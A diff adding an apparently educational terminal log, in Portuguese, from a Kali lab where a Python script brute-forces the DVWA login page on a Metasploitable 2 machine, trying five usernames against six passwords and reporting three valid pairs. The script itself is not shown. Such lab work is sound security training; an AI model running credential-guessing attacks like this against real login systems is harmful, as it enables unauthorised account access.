@@ -1,0 +1,52 @@
+                                                                                                                                                                      
+┌──(cperes㉿kali)-[~/projeto-medusa/scripts]
+└─$ python3 scriptDVWA.py
+============================================================
+  Teste de Login / Brute Force - DVWA (Low) - Educacional
+  Alvo: Metasploitable 2 | Atacante: Kali
+============================================================
+[+] Login no DVWA realizado com sucesso. Sessão obtida.
+
+[*] Iniciando testes em: http://192.168.56.101/dvwa/vulnerabilities/brute/
+[*] Usando 5 usuários e 6 senhas
+
+[*] Testando → admin : password ... [+] CREDENCIAIS VÁLIDAS!
+[*] Testando → admin : abc123 ... [-] FALHA
+[*] Testando → admin : charley ... [-] FALHA
+[*] Testando → admin : msfadmin ... [-] FALHA
+[*] Testando → admin : admin ... [-] FALHA
+[*] Testando → admin : 123456 ... [-] FALHA
+[*] Testando → msfadmin : password ... [-] FALHA
+[*] Testando → msfadmin : abc123 ... [-] FALHA
+[*] Testando → msfadmin : charley ... [-] FALHA
+[*] Testando → msfadmin : msfadmin ... [-] FALHA
+[*] Testando → msfadmin : admin ... [-] FALHA
+[*] Testando → msfadmin : 123456 ... [-] FALHA
+[*] Testando → 1337 : password ... [-] FALHA
+[*] Testando → 1337 : abc123 ... [-] FALHA
+[*] Testando → 1337 : charley ... [+] CREDENCIAIS VÁLIDAS!
+[*] Testando → 1337 : msfadmin ... [-] FALHA
+[*] Testando → 1337 : admin ... [-] FALHA
+[*] Testando → 1337 : 123456 ... [-] FALHA
+[*] Testando → pablo : password ... [-] FALHA
+[*] Testando → pablo : abc123 ... [-] FALHA
+[*] Testando → pablo : charley ... [-] FALHA
+[*] Testando → pablo : msfadmin ... [-] FALHA
+[*] Testando → pablo : admin ... [-] FALHA
+[*] Testando → pablo : 123456 ... [-] FALHA
+[*] Testando → smithy : password ... [+] CREDENCIAIS VÁLIDAS!
+[*] Testando → smithy : abc123 ... [-] FALHA
+[*] Testando → smithy : charley ... [-] FALHA
+[*] Testando → smithy : msfadmin ... [-] FALHA
+[*] Testando → smithy : admin ... [-] FALHA
+[*] Testando → smithy : 123456 ... [-] FALHA
+
+============================================================
+[+] Credenciais encontradas:
+    → admin / password
+    → 1337 / charley
+    → smithy / password
+============================================================
+                                                                                                                                                                      
+┌──(cperes㉿kali)-[~/projeto-medusa/scripts]
+└─$ 
